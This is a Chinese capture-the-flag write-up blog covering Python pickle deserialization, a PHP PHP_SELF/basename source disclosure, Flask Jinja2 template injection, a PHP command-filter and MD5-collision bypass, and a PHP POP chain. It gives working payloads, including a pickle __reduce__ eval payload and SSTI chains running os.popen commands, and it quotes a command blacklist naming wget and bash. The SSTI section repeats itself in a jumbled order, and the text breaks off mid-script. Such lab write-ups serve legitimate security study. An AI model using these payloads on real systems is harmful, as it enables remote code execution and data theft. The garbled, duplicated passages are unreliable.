&lt;pre&gt;&lt;code&gt;【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;检测反序列化方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pickle.dumps(obj[, protocol])
函数的功能：将obj对象序列化为string形式，而不是存入文件中。
参数讲解：
obj：想要序列化的obj对象。
protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;pickle.loads(string)
函数的功能：从string中读出序列化前的obj对象。
参数讲解：
string：文件名称。
【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;检测反序列化方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;防御方法&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法；
2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打洞&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, (&amp;quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&amp;quot;,))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;__&lt;/p&gt;
&lt;p&gt;c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.&lt;/p&gt;

 &lt;h2 id=&#34;zer0pts2020can-you-guess-it&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#zer0pts2020can-you-guess-it&#34;&gt;#&lt;/a&gt; [Zer0pts2020]Can you guess it?&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
include &#39;config.php&#39;; // FLAG is defined in config.php

if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &amp;#123;
  exit(&amp;quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&amp;quot;);
&amp;#125;

if (isset($_GET[&#39;source&#39;])) &amp;#123;
  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
  exit();
&amp;#125;

$secret = bin2hex(random_bytes(64));
if (isset($_POST[&#39;guess&#39;])) &amp;#123;
  $guess = (string) $_POST[&#39;guess&#39;];
  if (hash_equals($secret, $guess)) &amp;#123;
    $message = &#39;Congratulations! The flag is: &#39; . FLAG;
  &amp;#125; else &amp;#123;
    $message = &#39;Wrong.&#39;;
  &amp;#125;
&amp;#125;
?&amp;gt;
&amp;lt;!doctype html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Can you guess it?&amp;lt;/title&amp;gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;h1&amp;gt;Can you guess it?&amp;lt;/h1&amp;gt;
    &amp;lt;p&amp;gt;If your guess is correct, I&#39;ll give you the flag.&amp;lt;/p&amp;gt;
    &amp;lt;p&amp;gt;&amp;lt;a href=&amp;quot;?source&amp;quot;&amp;gt;Source&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
    &amp;lt;hr&amp;gt;
&amp;lt;?php if (isset($message)) &amp;#123; ?&amp;gt;
    &amp;lt;p&amp;gt;&amp;lt;?= $message ?&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;?php &amp;#125; ?&amp;gt;
    &amp;lt;form action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
      &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;guess&amp;quot;&amp;gt;
      &amp;lt;input type=&amp;quot;submit&amp;quot;&amp;gt;
    &amp;lt;/form&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;绕过 hash_equals 的思路来是行不通的，该函数并没有漏洞也没有使用错误。&lt;/p&gt;
&lt;p&gt;但是可以留意到显示源码的逻辑部分故作玄虚没有使用简洁的 &lt;code&gt;__FILE__&lt;/code&gt; 而是采用 &lt;code&gt;basename&lt;/code&gt;  函数截取 &lt;code&gt;$_SERVER[&#39;PHP_SELF&#39;]&lt;/code&gt; ，本题的利用点也就在此处。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$_SERVER[&#39;PHP_SELF&#39;]&lt;/code&gt;  会获取我们当前的访问路径，并且 PHP 在根据 URI 解析到对应文件后会忽略掉 URL 中多余的部分，即若访问存在的 index.php 页面，如下两种 UR 均会访问到。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;basename&lt;/code&gt;  可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录&lt;/p&gt;
&lt;p&gt;接下来就显然了，通过构造 URI 让其包含 &lt;code&gt;config.php&lt;/code&gt;  这个文件名再让 &lt;code&gt;basename&lt;/code&gt;  函数截取出来，之后通过请求参数 &lt;code&gt;source&lt;/code&gt;  就能显示 &lt;code&gt;config.php&lt;/code&gt;  的源码，也就能见到 &lt;code&gt;flag&lt;/code&gt;  了。&lt;/p&gt;
&lt;p&gt;payload：&lt;br&gt;
url+/index.php/config.php/%ff?source&lt;/p&gt;
&lt;p&gt;直接将文件的最后的文件读出，若不能识别，则返回上一级的文件名，打开该文件。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Csource%5Cimages%5C1-txt%5C2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;cscctf-2019-qualflasklight&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cscctf-2019-qualflasklight&#34;&gt;#&lt;/a&gt; [CSCCTF 2019 Qual]FlaskLight&lt;/h2&gt;
&lt;p&gt;\1. 进入题目可也看到有一个 FlaskLight 的提示，以及页面上显示你查询的和查询的结果字样。先查看源码发现提示内容：有一个 get 请求方式的参数 search   &lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1982633/202011/1982633-20201102194606533-361720538.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;\2. 传递参数 search 并进行模板注入的测试，输入？search=40，页面输出表达式的结果，很好可以进行模板注入，回显点在 You searched for 下面&lt;br&gt;
&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1982633/202011/1982633-20201102194621431-1470890437.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;\3. 寻找执行命可以借助的类&lt;br&gt;
 a. 获取变量 [] 所属的类名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;#123;&amp;#123;[].__class__&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    页面回显 &amp;lt;type ‘list’&amp;gt;&lt;br&gt;
​    b. 获取 list 所继承的基类名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;[].__class__.__base__&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    页面回显 &amp;lt;type ‘object’&amp;gt;&lt;br&gt;
​    c. 获取所有继承自 object 的类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    这里回显了很长一个列表，这里可以将这些数据放在列表中，通过 list.index 输出想要的类在第几位。不过需要对这传数据进行简单的处理（将 &amp;lt;&amp;gt; 换成 &amp;quot;&amp;quot;）&lt;/p&gt;
&lt;p&gt;​     &lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1982633/202011/1982633-20201102194738608-195518719.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;​    d. 经过查询后，可以借助的类 &amp;lt;class ‘warnings.catch_warnings’&amp;gt;，没有内置 os 模块在第 59 位。&amp;lt;class ‘site._Printer’&amp;gt; 内含 os 模块 在第 71 位，可以借助这些类来执行命令。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不含 os 模块的类 warnings.catch_warnings&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;进行命令执行&lt;br&gt;
 a. 目录读取&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;)&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    PS：由于使用 [‘&lt;strong&gt;globals&lt;/strong&gt;’] 会造成 500 的服务器错误信息，并且当我直接输入 search=globals 时页面也会 500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式 [‘&lt;strong&gt;glo’+&#39;bals&lt;/strong&gt;’]&lt;br&gt;
​    页面回显：bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var&lt;br&gt;
​    b. 读取目录 flasklight&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;ls /flasklight&#39;).read()&#34;)&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    页面回显：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FwcC5weQ==&#34;&gt;app.py&lt;/span&gt; coomme_geeeett_youur_flek&lt;br&gt;
​    c. cat 文件 coomme_geeeett_youur_flek 得到 flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;cat /flasklight/coomme_geeeett_youur_flek &#39;).read()&#34;)&amp;#125;&amp;#125;  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    页面回显：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FwcC5weQ==&#34;&gt;app.py&lt;/span&gt; coomme_geeeett_youur_flek&lt;br&gt;
​    c. cat 文件 coomme_geeeett_youur_flek 得到 flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;cat /flasklight/coomme_geeeett_youur_flek &#39;).read()&#34;)&amp;#125;&amp;#125;  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    PS：由于使用 [‘&lt;strong&gt;globals&lt;/strong&gt;’] 会造成 500 的服务器错误信息，并且当我直接输入 search=globals 时页面也会 500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式 [‘&lt;strong&gt;glo’+&#39;bals&lt;/strong&gt;’]&lt;br&gt;
​    页面回显：bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var&lt;br&gt;
​    b. 读取目录 flasklight&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;ls /flasklight&#39;).read()&#34;)&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    页面回显：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FwcC5weQ==&#34;&gt;app.py&lt;/span&gt; coomme_geeeett_youur_flek&lt;br&gt;
​    c. cat 文件 coomme_geeeett_youur_flek 得到 flag&lt;br&gt;
​&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;cat /flasklight/coomme_geeeett_youur_flek &#39;).read()&#34;)&amp;#125;&amp;#125;  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    页面回显：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FwcC5weQ==&#34;&gt;app.py&lt;/span&gt; coomme_geeeett_youur_flek&lt;br&gt;
​    c. cat 文件 coomme_geeeett_youur_flek 得到 flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;cat /flasklight/coomme_geeeett_youur_flek &#39;).read()&#34;)&amp;#125;&amp;#125;  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​     &lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1982633/202011/1982633-20201102194722781-1482931879.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;​    d. 之后又 cat 了一下同目录下的 app.py 文件，发现确实 gloabls 在和名单下&lt;br&gt;
​      &lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1982633/202011/1982633-20201102194709666-1067124113.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;内含 os 模块的类&lt;/strong&gt; &lt;strong&gt;class’site._Printer’&lt;/strong&gt;&lt;br&gt;
a. 目录查询&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    因为这里 listdir 同样被 ban 了&lt;br&gt;
 b. 读取目录 flasklight&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls /flasklight&#39;).read()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    c. 读取 flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat coomme_geeeett_youur_flek&#39;).read()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    c. 读取 flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat coomme_geeeett_youur_flek&#39;).read()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    因为这里 listdir 同样被 ban 了&lt;br&gt;
 b. 读取目录 flasklight&lt;br&gt;
​&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls /flasklight&#39;).read()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​    c. 读取 flag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat coomme_geeeett_youur_flek&#39;).read()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;[&lt;img data-src=&#34;https://assets.cnblogs.com/images/copycode.gif&#34; alt=&#34;复制代码&#34;&gt;](javascript:void (0)😉&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a. 获取变量[]所属的类名 &amp;#123;&amp;#123;[].__class__&amp;#125;&amp;#125;
b. 获取list所继承的基类名 &amp;#123;&amp;#123;[].__class__.__base__&amp;#125;&amp;#125;    
c. 获取所有继承自object的类 &amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()&amp;#125;&amp;#125;

没有内置的os模块的类
目录查询
&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;)&amp;#125;&amp;#125;
读取目录flask
&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;ls /flasklight&#39;).read()&#34;)&amp;#125;&amp;#125;
读取flag
&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;cat /flasklight/coomme_geeeett_youur_flek &#39;).read()&#34;)&amp;#125;&amp;#125;
内含os模块的类（不需要import os）
class&#39;site._Printer&#39; 内含os模块 在第71位
目录查询
&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&amp;#125;&amp;#125;
 本来想直接用listdir(&#39;/&#39;)，但这里listdir同样被ban了
读取目录flasklight
&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls /flasklight&#39;).read()&amp;#125;&amp;#125;
读取flag
&lt;/code&gt;&lt;/pre&gt;

 &lt;h2 id=&#34;安洵杯-2019easy_web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安洵杯-2019easy_web&#34;&gt;#&lt;/a&gt; [安洵杯 2019] easy_web&lt;/h2&gt;
&lt;p&gt;进行两次 base64 解密，和 hex 转字符串，得到类似图片名 555.png。&lt;/p&gt;
&lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header(&#39;content-type:text/html;charset=utf-8&#39;);
$cmd = $_GET[&#39;cmd&#39;];
if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));

$file = preg_replace(&#34;/[^a-zA-Z0-9.]+/&#34;, &#34;&#34;, $file);
if (preg_match(&#34;/flag/i&#34;, $file)) {
    echo &#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;;
    die(&#34;xixi～ no flag&#34;);
} else {
    $txt = base64_encode(file_get_contents($file));
    echo &#34;&lt;img data-src=&#39;data:image/gif;base64,&#34; . $txt . &#34;&#39;&gt;&lt;/img&gt;&#34;;
    echo &#34;&lt;br&gt;&#34;;
}
echo $cmd;
echo &#34;&lt;br&gt;&#34;;
if (preg_match(&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&#34;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;, $cmd)) {
    echo(&#34;forbid ~&#34;);
    echo &#34;&lt;br&gt;&#34;;
} else {
    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
        echo `$cmd`;
    } else {
        echo (&#34;md5 is funny ~&#34;);
    }
}

?&gt;
&lt;html&gt;
&lt;style&gt;
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
&lt;/style&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;p&gt;img=555.png, 可以怀疑是文件包含，直接相同方式将 index.php 转成 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&lt;/p&gt;
&lt;p&gt;将其重新换成代码成上述那样&lt;/p&gt;
&lt;p&gt;5 根据源代码，该页面会通过 GET 方式获取一个 cmd 参数，&lt;/p&gt;
&lt;p&gt;然后是一个正则匹配的黑名单，如果传入的 cmd 的值被匹配到的话就会输出 forbid。&lt;/p&gt;
&lt;p&gt;绕过过滤后，还得通过 POST 传入两个 md5 值相等但本身不等的字符串才能执行命令。&lt;/p&gt;
&lt;p&gt;MD5 值相等的字符串我之前收集了一组，直接拿来用。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过 \ 来绕过正则，并通过 POST 传入 a 和 b，得到 flag。 使用 hackbar 会进行转码，传入会失败&lt;/p&gt;
&lt;h2 id=&#34;反序列化的魔术方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反序列化的魔术方法&#34;&gt;#&lt;/a&gt; 反序列化的魔术方法：&lt;/h2&gt;
&lt;p&gt;1.__destruct (类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。)&lt;br&gt;
 2.__construct (类一执行就开始调用，其作用是拿来初始化一些值。)&lt;br&gt;
3._&lt;em&gt;toString (在对象当做字符串的时候会被调用。)&lt;br&gt;
4&lt;/em&gt;.&lt;em&gt;wakeup (该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作)&lt;br&gt;
5&lt;/em&gt;.&lt;em&gt;sleep (在对象被序列化的过程中自动调用。sleep 要加数组)&lt;br&gt;
6&lt;/em&gt;.&lt;em&gt;invoke (当尝试以调用函数的方式调用一个对象时，方法会被自动调用)&lt;br&gt;
7&lt;/em&gt;._get (当访问类中的私有属性或者是不存在的属性，触发__get 魔术方法)&lt;br&gt;
 8.__set (在对象访问私有成员的时候自动被调用，达到了给你看，但是不能给你修改的效果！在对象访问一个私有的成员的时候就会自动的调用该魔术方法)&lt;br&gt;
9.&lt;em&gt;call (当所调用的成员方法不存在（或者没有权限）该类时调用，用于对错误后做一些操作或者提示信息)&lt;br&gt;
10&lt;/em&gt;._isset (方法用于检测私有属性值是否被设定。当外部使用 isset 读类内部进行检测对象是否有具有某个私有成员的时候就会被自动调用！)&lt;br&gt;
 11.__unset (方法用于删除私有属性。在外部调用类内部的私有成员的时候就会自动的调用__unset 魔术方法)&lt;/p&gt;
&lt;h2 id=&#34;mrctf2020-ezpop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mrctf2020-ezpop&#34;&gt;#&lt;/a&gt; 「MRCTF2020」- Ezpop&lt;/h2&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&gt;append($this-&gt;var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file=&#39;index.php&#39;){
        $this-&gt;source = $file;
        echo &#39;Welcome to &#39;.$this-&gt;source.&#34;&lt;br&gt;&#34;;
    }
    public function __toString(){
        return $this-&gt;str-&gt;source;
    }

    public function __wakeup(){
        if(preg_match(&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;, $this-&gt;source)) {
            echo &#34;hacker&#34;;
            $this-&gt;source = &#34;index.php&#34;;
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this-&gt;p = array();
    }

    public function __get($key){
        $function = $this-&gt;p;
        return $function();
    }
}

if(isset($_GET[&#39;pop&#39;])){
    @unserialize($_GET[&#39;pop&#39;]);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}

pop链：

首先反序列化函数，触发Show类中的wakeup方法，wakeup方法做字符串处理，触发tosring方法，如果将str实例化为Test，因为Test类中不含source属性，所以调用get方法，将function实例化为Modifier类，即可触发其中invoke方法，最终调用文件包含函数，读取flag.php

首先分析一共有三个类

​      Modifier
​      Show
​      Test

看到Modifier这个类

class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function invoke方法，__invoke方法调用了append函数，而__invoke方法怎么触发呢？(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)好，那么我们继续往下看
看到Show这个类

class Show{
    public $source;
    public $str;
    public function __construct($file=&#39;index.php&#39;){
        $this-&gt;source = $file;
        echo &#39;Welcome to &#39;.$this-&gt;source.&#34;&lt;br&gt;&#34;;
    }
    public function __toString(){
        return $this-&gt;str-&gt;source;
    }

    public function __wakeup(){
        if(preg_match(&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;, $this-&gt;source)) {
            echo &#34;hacker&#34;;
            $this-&gt;source = &#34;index.php&#34;;
        }
    }
}

首先看到__construct方法，这里暂时没什么用，然后我们看到__toString方法，这里是一个输出点，暂时放着，没有什么思路
看到Test这个类

class Test{
    public $p;
    public function __construct(){
        $this-&gt;p = array();
    }

    public function __get($key){
        $function = $this-&gt;p;
        return $function();
    }
}

这里有个__get()方法，我们知道(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)，而哪里使用了私有属性呢，很明显是Modifier这个类，__get方法它返回的是函数，而__invoke方法(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)

所以我们的思路是：
首先使$var=php://filter/read=convert.base64-encode/resource=flag.php
包含一个flag.php
然后使用Test类里的__get方法调用Modifier类中的__invoke方法，怎么调用呢？使$p这个变量为Modifier这个对象就可以调用__invoke方法，最后使用Show这个类里的__toString方法输出被包含的flag。
使用Test类里的__get方法调用Modifier类中的__invoke方法很简单
只需要new一个Test和new一个Modifier
然后使Test-&gt;p = new Modifier();
如果使Show-&gt;str=new Test();
然后Test这个类调用了一个不存在的变量(source)触发__get()方法。
但是这个__toString方法的调用着实卡了我好久
该怎么调用__toString方法呢？
这里我们看到源代码的一段

  public function __wakeup()
    {
        if (preg_match(&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;, $this-&gt;source)) {
            echo &#34;hacker&#34;;
            $this-&gt;source = &#34;index.php&#34;;
        }
    }

这里preg_match对类中的source进行比较，将它作为字符串，所以就调用了__toString方法
__toString是在对象被当成字符串的时候调用
所以这里我们需要使Show-&gt;source = new Show();
即可调用__toString方法
构造pop链：

Modifier-&gt;__invoke()-&gt;append()-&gt;flag
Test-&gt;__get()-&gt;Modifier
Show-&gt;__wakeup()-&gt;__toString()-&gt;Test

所以完整的pop链:

Show-&gt;__wakeup()(preg_match把对象当作字符串触发)-&gt;__toString()(使类中的source为Test对象，输出不存在的对象触发)-&gt;Test-&gt;__get()方法-&gt;Modifier-&gt;__invoke()(调用对象以函数的形式触发)-&gt;append()-&gt;include(文件包含，包含flag)



一键getflag.py

import requests
import base64
url = &#34;http://dd9a4b21-3907-4515-b26b-998e448cc729.node3.buuoj.cn/?pop=&#34;
